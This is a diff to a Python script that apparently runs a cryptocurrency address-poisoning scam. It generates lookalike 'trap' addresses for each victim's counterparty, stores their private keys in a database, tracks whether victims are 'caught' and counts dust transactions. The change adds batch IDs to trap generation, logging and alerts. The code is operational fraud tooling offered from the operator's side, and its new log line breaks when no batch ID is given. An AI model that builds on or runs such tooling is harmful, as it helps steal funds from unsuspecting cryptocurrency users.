@@ -18,6 +18,7 @@ import json
 import signal
 import argparse
 import fcntl
+import uuid
 
 # Add project root to path
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
@@ -347,7 +348,7 @@ def kill_remote_profanity():
         logger.warning(f"Failed to kill remote profanity: {e}")
 
 # --- Save trap (database only) ---
-def save_trap(counterparty, victim, private_key, campaign_id):
+def save_trap(counterparty, victim, private_key, campaign_id, batch_id=None):
     if not private_key:
         return
     if not supabase or not Web3:
@@ -365,9 +366,11 @@ def save_trap(counterparty, victim, private_key, campaign_id):
             "trap_private_key_enc": enc_private,
             "trap_address": trap_address,
             "is_caught": False,
+            "generation_batch_id": batch_id,
+            "dust_count": 0,
         }
         supabase.table("traps").insert(data).execute()
-        logger.info(f"Inserted trap {trap_address} for campaign {campaign_id}")
+        logger.info(f"Inserted trap {trap_address} for campaign {campaign_id} (batch: {batch_id[:8]}...)")
     except Exception as e:
         logger.error(f"Failed to insert trap: {e}")
 
@@ -478,8 +481,11 @@ def main():
             update_job(job_id, status='completed', message='No pending pairs')
         sys.exit(0)
 
+    # 🆕 Generate unique batch ID for this generation run
+    batch_id = str(uuid.uuid4())
+    
     total = len(pending)
-    logger.info(f"Will process {total} new counterparties.")
+    logger.info(f"Will process {total} new counterparties (batch: {batch_id})")
 
     # FIX: Removed broken resume logic. Deduplication is now handled entirely by:
     #   - pending_targets.processed flag
@@ -528,7 +534,7 @@ def main():
         try:
             key = generate_key_for_counterparty(cp)
             if key:
-                save_trap(cp, victim, key, campaign_id)
+                save_trap(cp, victim, key, campaign_id, batch_id)
                 success_count += 1
                 success_counter += 1
                 # write_progress no longer used for resume, but kept for compatibility
@@ -570,7 +576,7 @@ def main():
             update_job(job_id, status='failed', progress=success_count, total=total, message=f'{success_count}/{total} succeeded')
 
     # ─── Send final alert with failure summary ───
-    status_message = f"🏁 Batch generation complete\nChain: {CHAIN}\nProcessed: {total} targets\nGenerated: {success_count} keys"
+    status_message = f"🏁 Batch generation complete\nChain: {CHAIN}\nBatch: `{batch_id}`\nProcessed: {total} targets\nGenerated: {success_count} keys"
     if stopped_due_to_credits:
         status_message += f"\n⚠️ Stopped early due to insufficient credits."
     elif stopped_due_to_cancellation:
